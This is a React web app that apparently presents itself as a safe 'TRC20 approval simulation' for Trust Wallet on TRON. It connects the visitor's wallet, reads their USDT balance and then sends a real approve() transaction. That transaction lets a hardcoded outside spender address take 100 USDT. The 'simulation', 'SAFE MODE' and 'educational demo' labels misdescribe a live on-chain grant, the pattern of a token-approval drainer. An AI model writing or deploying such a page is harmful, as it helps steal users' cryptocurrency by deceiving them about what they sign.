import React, { useEffect, useState } from "react";

/* =========================
   CONFIG (TRON / TRC20)
========================= */

// ✅ USDT TRC20 (OFFICIAL)
const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// ✅ DEMO spender (TRON address format ONLY)
const SPENDER_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";

// ✅ SAFE approval amount (100 USDT, 6 decimals)
const APPROVAL_AMOUNT = "100000000"; // 100 * 10^6

function App() {
  const [wallet, setWallet] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [contract, setContract] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1);

  /* =========================
     HELPERS
  ========================= */
  const addLog = (msg) =>
    setLogs((p) => [...p, `${new Date().toLocaleTimeString()}  ${msg}`]);

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  /* =========================
     TRUST WALLET DETECTION
  ========================= */
  useEffect(() => {
    if (window.tronWeb && window.tronWeb.ready) {
      setTronWeb(window.tronWeb);
      addLog("✅ Trust Wallet (TRON) detected");
    } else {
      addLog("❌ Please open this site inside Trust Wallet Browser");
    }
  }, []);

  /* =========================
     CONNECT WALLET
  ========================= */
  const connectWallet = async () => {
    try {
      if (!window.tronWeb || !window.tronWeb.ready) {
        alert("Open this site inside Trust Wallet Browser");
        return;
      }

      const address = window.tronWeb.defaultAddress.base58;
      if (!address) {
        addLog("❌ Wallet locked – unlock Trust Wallet");
        return;
      }

      const trx = await window.tronWeb.trx.getBalance(address);

      // ✅ Correct way to load TRC20 contract
      const tokenContract = await window.tronWeb
        .contract()
        .at(TRC20_TOKEN_ADDRESS);

      setWallet({
        address,
        short: address.slice(0, 8) + "..." + address.slice(-6),
        trx: (trx / 1_000_000).toFixed(4),
      });

      setContract(tokenContract);
      addLog("✅ Wallet connected successfully");
      setStep(2);
    } catch (err) {
      console.error(err);
      addLog("❌ Wallet connection failed");
    }
  };

  /* =========================
     SIMULATE APPROVAL (SAFE)
  ========================= */
  const simulate = async () => {
    try {
      setLoading(true);

      if (!wallet || !contract) {
        addLog("❌ Wallet not ready");
        return;
      }

      addLog("🔍 Checking token balance...");
      await sleep(500);

      const balance = await contract
        .balanceOf(window.tronWeb.address.toHex(wallet.address))
        .call();

      addLog(`💰 USDT Balance: ${(balance / 1e6).toFixed(4)}`);
      await sleep(500);

      const confirm = window.confirm(
        "⚠️ EDUCATIONAL DEMO\n\n" +
          "You are approving a LIMITED amount (100 USDT).\n" +
          "No unlimited approval.\n\nContinue?"
      );

      if (!confirm) {
        addLog("❌ User cancelled");
        return;
      }

      addLog("📝 Sending approve transaction...");

      const tx = await contract
        .approve(
          window.tronWeb.address.toHex(SPENDER_ADDRESS),
          APPROVAL_AMOUNT
        )
        .send({
          feeLimit: 100_000_000,
        });

      addLog(`✅ Transaction sent: ${tx}`);
      addLog("🎓 Approval completed (SAFE MODE)");
      setStep(3);
    } catch (err) {
      console.error(err);
      if (err.message?.includes("User denied")) {
        addLog("❌ User rejected transaction");
      } else {
        addLog("❌ Transaction failed");
      }
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     UI
  ========================= */
  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
      <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">

        <h1 className="text-xl font-bold text-center mb-4">
          🔐 TRC20 Approval Demo (Safe)
        </h1>

        {/* Logs */}
        {logs.length > 0 && (
          <div className="bg-black p-3 rounded text-sm mb-4 max-h-60 overflow-y-auto">
            {logs.map((l, i) => (
              <div key={i}>{l}</div>
            ))}
          </div>
        )}

        {/* STEP 1 */}
        {step === 1 && (
          <button
            onClick={connectWallet}
            className="w-full py-3 bg-blue-600 rounded font-bold"
          >
            Connect Trust Wallet
          </button>
        )}

        {/* STEP 2 */}
        {step === 2 && wallet && (
          <>
            <div className="bg-black p-3 rounded text-sm mb-3">
              <p>📱 Trust Wallet</p>
              <p>Address: {wallet.short}</p>
              <p>TRX: {wallet.trx}</p>
            </div>

            <button
              onClick={simulate}
              disabled={loading}
              className="w-full py-3 bg-red-600 rounded font-bold"
            >
              {loading ? "Processing..." : "Start Approval Simulation"}
            </button>
          </>
        )}

        {/* STEP 3 */}
        {step === 3 && (
          <div className="bg-black p-3 rounded text-sm">
            <p className="text-green-400">✅ Demo complete</p>
            <p className="text-yellow-400 mt-2">
              ⚠️ Never approve unlimited amounts in real life
            </p>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
